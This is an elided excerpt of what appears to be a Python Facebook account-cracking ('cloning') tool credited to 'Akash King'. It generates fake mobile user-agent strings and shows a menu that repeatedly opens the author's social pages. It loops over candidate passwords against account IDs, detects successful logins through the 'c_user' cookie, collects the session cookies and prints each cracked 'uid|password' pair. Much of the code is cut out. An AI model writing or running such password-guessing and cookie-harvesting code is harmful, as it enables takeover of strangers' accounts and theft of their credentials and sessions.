...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/Akash-IN')
...
\033[1;94m       [+]===============================================[+]
\033[1;94m       [+]        CREATED BY   :  Akash King               \033[1;94m[+]
\033[1;94m       [+]        ON GITHUB    :  Akash-King               \033[1;94m[+]
...
class Main:
    def __init__(self):
        ...
        print(" [00] Exit")        
        Alif =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/profile.php?id=100074255215010&mibextid=ZbWKwL')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('xdg-open https://www.facebook.com/profile.php?id=100074255215010&mibextid=ZbWKwL')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Akash-CP🔪] {uid}|{ps}")
